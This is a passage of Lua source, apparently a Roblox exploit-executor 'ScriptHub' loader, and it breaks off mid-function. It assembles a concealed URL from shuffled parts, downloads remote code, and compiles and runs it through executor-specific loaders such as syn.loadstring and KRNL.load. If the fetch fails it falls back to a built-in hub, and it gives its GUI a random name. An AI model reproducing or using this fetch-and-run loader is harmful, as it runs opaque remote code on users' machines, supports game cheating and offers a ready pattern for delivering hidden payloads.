local function _shuffleParts(src)
	local _order = {1, 2, 3, 4, 5}
	local _dst = {}
	for _i = 1, #_order do
		_dst[_i] = src[_order[_i]]
	end
	return _dst
end

local function _buildHubUrl()
	return table.concat(_shuffleParts(_buildParts()))
end

local function _chooseLoader()
	local _candidates = {}
	local function _push(f)
		if type(f) == "function" then
			_candidates[#_candidates + 1] = f
		end
	end
	pcall(function() _push(loadstring) end)
	pcall(function() _push(load) end)
	pcall(function() _push(syn and syn.loadstring) end)
	pcall(function() _push(syn and syn.loadfunc) end)
	pcall(function() _push(KRNL and KRNL.load) end)
	pcall(function() _push(getfenv and getfenv(0) and getfenv(0).loadstring) end)
	if #_candidates > 0 then
		return _candidates[1]
	end
	return nil
end

local function _tryLoad(code)
	if type(code) ~= "string" or #code == 0 then
		return false, "empty content"
	end
	local _loader = _chooseLoader()
	if type(_loader) ~= "function" then
		return false, "no loader found"
	end
	local _ok, _a, _b = pcall(_loader, code)
	if not _ok then
		return false, _T(_a)
	end
	if type(_a) == "function" then
		return true, _a
	end
	if type(_b) == "function" then
		return true, _b
	end
	if type(_b) == "string" then
		return false, _b
	end
	return false, "compile failed"
end

local function _safeExec(fn)
	if type(fn) ~= "function" then return false, "bad function" end
	local _ok, _err = pcall(fn)
	if not _ok then return false, _T(_err) end
	return true
end

local function _loadHub()
	_errNotify("Opening ScriptHub...")
	task.spawn(function()
		local _ok, _err = pcall(function()
			local _url = _buildHubUrl()
			local _content = _safeGet(_url)
			local _loader
			if type(_content) == "string" and #_content > 0 then
				local _loaded, _result = _tryLoad(_content)
				if _loaded then
					_loader = _result
				else
					warn("[Script Hub] remote compile: " .. _T(_result))
				end
			end
			if not _loader then
				local _fb = _fallbackHub()
				local _loaded, _result = _tryLoad(_fb)
				if not _loaded then
					error("fb:" .. _T(_result))
				end
				_loader = _result
			end
			local _ran, _rerr = _safeExec(_loader)
			if not _ran then
				error(_T(_rerr))
			end
		end)
		if not _ok then
			_errNotify("Hub error: " .. _T(_err))
			warn("[Script Hub] " .. _T(_err))
		end
	end)
end

local function _newGui()
	local _g = Instance.new("ScreenGui")
	_g.Name = "HUD_" .. _T(_flr(_rnd(1, 9999)))
	_g.ResetOnSpawn = false
